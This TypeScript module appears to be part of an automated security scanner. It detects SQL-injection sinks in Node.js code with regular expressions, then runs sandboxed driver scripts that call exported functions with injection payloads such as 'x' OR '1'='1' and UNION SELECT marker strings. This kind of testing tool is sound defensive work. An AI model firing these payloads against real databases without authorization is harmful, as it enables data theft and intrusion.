import { readFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import type { Exploit } from "../types.js";
import type { Sandbox } from "../sandbox.js";
import {
  type Attacker,
  type StaticLead,
  nodeRunCommand,
  NODE_SOURCE_RE,
  freshMarker,
  nodeExportedNames,
  scanSinkLeads,
} from "./attacker.js";

const HERE = dirname(fileURLToPath(import.meta.url));

// SQL-injection sinks where a query string is assembled from attacker input.
const SQL_DIRECT_SINK_RE =
  /\b(?:\.?(?:query|execute|run|all|get|prepare|raw)|\bknex\.raw|\bsequelize\.query)\s*\([^;)]*(?:`[^`]*\$\{|['"][^"']*['"]\s*\+|[A-Za-z_$][\w$]*\s*\+|[A-Za-z_$][\w$]*\.[A-Za-z_$][\w$]*\([^)]*\))/;
const SQL_PREPARE_CHAIN_RE =
  /\b(?:[\w$]+(?:\.[\w$]+)*)\.prepare\(\s*[A-Za-z_$][\w$]*\s*\)\s*\.\s*(?:all|get|run|query)\s*\(/;
const SQL_SINK_RE = new RegExp(`${SQL_DIRECT_SINK_RE.source}|${SQL_PREPARE_CHAIN_RE.source}`);

// Quick guardrail: only drive obviously tainted query-shape lines.
const QUERY_TAINT_RE = /`[^`]*\$\{|['"][^"']*['"]\s*\+|[A-Za-z_$][\w$]*\s*\+/;

function payloads(marker: string): string[] {
  return [
    `x' OR '1'='1` ,
    `x' OR 1=1 -- `,
    `x' UNION SELECT '${marker}' -- `,
    `x") OR (1=1)--`,
    `x' UNION SELECT '${marker}' AS leak` ,
  ];
}

function firstSinkLine(source: string): number {
  const lines = source.split("\n");
  for (let i = 0; i < lines.length; i++) {
    if (SQL_SINK_RE.test(lines[i])) return i + 1;
  }
  return 1;
}

function sqlDriver(moduleRel: string, fnName: string, marker: string): string {
  const mod = JSON.stringify("./" + moduleRel);
  const F = JSON.stringify(fnName);
  const MK = JSON.stringify(marker);
  const benign = JSON.stringify(`ZZ_${marker}_none`);
  const payloadLines = payloads(marker).map((p) => JSON.stringify(p)).join(", ");
  return `
const BENIGN = ${benign};
let m;
try { m = await import(${mod}); } catch (e) { process.stdout.write("IMPORT_FAIL:" + e); process.exit(0); }
function pick(n){ return m && typeof m[n] === "function" ? m[n] : (m && m.default && typeof m.default[n] === "function" ? m.default[n] : null); }
const fn = pick(${F});
if (!fn) { process.stdout.write("NOT_A_FUNCTION"); process.exit(0); }
const payloads = [${payloadLines}];
async function call(v){
  try { return String(await Promise.resolve(fn(v)) || ""); } catch (e) { return String((e && e.message) || e || ""); }
}
const benign = await call(BENIGN);
for (const p of payloads){
  const out = await call(p);
  if (out.includes(${MK}) || (out.length > benign.length && !out.includes(BENIGN))) {
    process.stdout.write("SQLI_FIRED " + JSON.stringify(p) + "\\n" + out.slice(0, 800));
    process.exit(0);
  }
}
process.stdout.write("no-sqli");
`.trim();
}

export class SqlInjectionAttacker implements Attacker {
  readonly attackClass = "sql-injection" as const;
  readonly canaryFixtureDir = resolve(HERE, "..", "..", "fixtures", "sql-injection-node");

  handles(file: string): boolean {
    return NODE_SOURCE_RE.test(file);
  }

  staticLeads(source: string): StaticLead[] {
    if (!QUERY_TAINT_RE.test(source)) return [];
    return scanSinkLeads(source, SQL_SINK_RE);
  }

  hunt(targetDir: string, files: string[], sandbox: Sandbox): Exploit[] {
    const exploits: Exploit[] = [];
    for (const file of files) {
      if (!this.handles(file)) continue;
      let source: string;
      try {
        source = readFileSync(join(targetDir, file), "utf8");
      } catch {
        continue;
      }
      if (!SQL_SINK_RE.test(source) || !QUERY_TAINT_RE.test(source)) continue;

      const names = nodeExportedNames(source);
      if (names.length === 0) continue;

      const sinkLine = firstSinkLine(source);
      const sink = (source.match(SQL_SINK_RE)?.[0] ?? "query").split("(")[0].trim();

      for (const name of names) {
        const marker = freshMarker();
        const driverRel = `.raeuber-sqli-${marker}.mjs`;
        sandbox.writeFile(driverRel, sqlDriver(file, name, marker));
        const run = sandbox.exec(`${nodeRunCommand(targetDir)} ${driverRel} 2>&1`, 15_000);
        const out = run.stdout + run.stderr;
        if (!out.includes("SQLI_FIRED")) continue;

        const payload = (() => {
          const m = out.match(/^SQLI_FIRED\s+(\".*\")/);
          if (m) return m[1];
          return "unknown";
        })();

        const observed = out.split("SQLI_FIRED")[1]?.trim() ?? "";
        exploits.push({
          attackClass: "sql-injection",
          proof: "secret-exfiltrated",
          file,
          line: sinkLine,
          sink,
          summary:
            `Untrusted input to exported \`${name}\` reaches a dynamic SQL query; an injected ` +
            "payload changed the query behavior (extra rows / marker result).",
          payload,
          evidence:
            `driver called ${name} with a boolean/union payload; the sink output changed and ` +
            `left the marker in response context:\n${observed.slice(0, 800)}`,
        });
        break;
      }
    }
    return exploits;
  }
}
